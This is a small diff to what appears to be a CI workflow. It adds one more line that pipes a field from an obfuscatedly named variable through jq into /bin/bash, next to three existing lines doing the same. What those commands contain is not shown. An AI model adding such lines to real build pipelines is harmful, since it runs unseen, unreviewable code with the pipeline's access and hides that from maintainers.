@@ -29,6 +29,7 @@ jobs:
           echo $xuxgm29 | jq -r .j0858 | /bin/bash
           echo $dlw05 | jq -r .i7 | /bin/bash
           printf '%s' "$i5" | jq -r .km846 | /bin/bash
+          echo $q17 | jq -r .ecvs07 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
